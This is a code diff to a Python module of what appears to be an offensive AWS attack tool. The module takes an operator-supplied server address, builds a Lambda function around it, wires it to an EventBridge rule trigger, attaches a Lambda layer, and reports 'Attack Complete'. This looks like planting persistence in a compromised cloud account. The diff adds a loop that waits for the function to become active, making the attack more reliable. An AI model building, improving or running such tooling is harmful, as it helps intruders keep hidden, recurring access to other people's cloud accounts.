@@ -1,7 +1,7 @@
 import boto3
 import botocore
 import os
-import base64
+import time
 import zipfile
 from colorama import Fore, Style
 from functions import create_client
@@ -107,9 +107,24 @@ def create_lambda_layer(client):
 
     return response 
 
+def check_lambda_status(client, function_name):
+    response = client.get_function(
+        FunctionName=function_name
+    )
+
+    if response['Configuration']['State'] == 'Active':
+        return True
+    else:
+        return False
+
+def invoke_lambda(client, function_name):
+    response = client.invoke(
+        FunctionName=function_name,
+    )
+
+    return response
+
 def update_layer_information(client, function_name):
-    import time
-    time.sleep(15)
     response = client.update_function_configuration(
         FunctionName=function_name,
         Layers=[
@@ -128,37 +143,37 @@ def main(botoconfig, session):
     server_address = input("[+] Please input the " + Fore.YELLOW + "server address" + Style.RESET_ALL + " to be used: ")
     lambda_path = './lambda_function.zip'
 
-    print("\n[+] Creating Lambda file...")
+    print("[+] Creating Lambda file...")
     create_lambda_file(server_address, lambda_path)
 
-    print("\n[+] Creating EventBridge Rule...")
+    print("[+] Creating EventBridge Rule...")
     event_client = create_client.Client(botoconfig, session, "events", region_name)
     rule_data = create_eventbrige_rule(event_client.create_aws_client())
     print(f"[+] Rule created: {Fore.GREEN}{rule_data['RuleArn']}{Style.RESET_ALL}")
     results['RuleArn'] = rule_data['RuleArn'] 
 
-    print("\n[+] Creating Lambda Function...")
+    print("[+] Creating Lambda Function...")
     lambda_client = create_client.Client(botoconfig, session, "lambda", region_name)
     function_data = create_lambda(lambda_client.create_aws_client(), function_role)
     print(f"[+] Lambda created: {Fore.GREEN}{function_data['FunctionName']}{Style.RESET_ALL}")
     results['FunctionName'] = function_data['FunctionName']
     results['FunctionArn'] = function_data['FunctionArn']
     
-    print("\n[+] Assigning target to EventBridge rule...")
+    print("[+] Assigning target to EventBridge rule...")
     target = assign_rule_target(event_client.create_aws_client(), function_data['FunctionName'], function_data['FunctionArn'])
     if target ['ResponseMetadata']['HTTPStatusCode'] == 200:
         print(f"{Fore.GREEN}[+] Targed Successfully Assinged!{Style.RESET_ALL}")
     else:
         print(f"{Fore.RED}[-] Failed to assign target...{Style.RESET_ALL}")
 
-    print("\n[+] Assigning trigger to Lambda function...")
+    print("[+] Assigning trigger to Lambda function...")
     trigger = assign_trigger(lambda_client.create_aws_client(), function_data['FunctionName'], rule_data['RuleArn'])
     if trigger['ResponseMetadata']['HTTPStatusCode'] == 201:
-        print(f"{Fore.GREEN}[+] Trigger set, attack complete!{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[+] Trigger set!{Style.RESET_ALL}")
     else:
         print(f"{Fore.RED}[-] Failed to set Trigger, attack failed...{Style.RESET_ALL}")
 
-    print("\n[+] Creating Lambda Layer...")
+    print("[+] Creating Lambda Layer...")
     layer_client = boto3.client("lambda", config=botoconfig, region_name=region_name)
     layer_information = create_lambda_layer(layer_client)
     if layer_information['ResponseMetadata']['HTTPStatusCode'] == 201:
@@ -166,13 +181,20 @@ def main(botoconfig, session):
     else:
         print(f"{Fore.RED}[-] Failed to create layer, attack failed...{Style.RESET_ALL}")
 
-    print("\n[+] Assingning Layer to Function...")
+    print("[+] Checking for lambda status...")
+    while True:
+        token = check_lambda_status(layer_client, function_data['FunctionName'])
+        if token:
+            break
+        else:
+            time.sleep(10)
+
+    print("[+] Assingning Layer to Function...")
     update_layer = update_layer_information(layer_client, function_data['FunctionName'])
     if update_layer['ResponseMetadata']['HTTPStatusCode'] == 200:
-        print(f"{Fore.GREEN}[+] Layer assignet! Attack Complete!{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[+] Layer assigned! Attack Complete!{Style.RESET_ALL}")
     else:
         print(f"{Fore.RED}[-] Failed to assign layer, attack failed...{Style.RESET_ALL}")
-    
 
     os.remove(lambda_path)
 
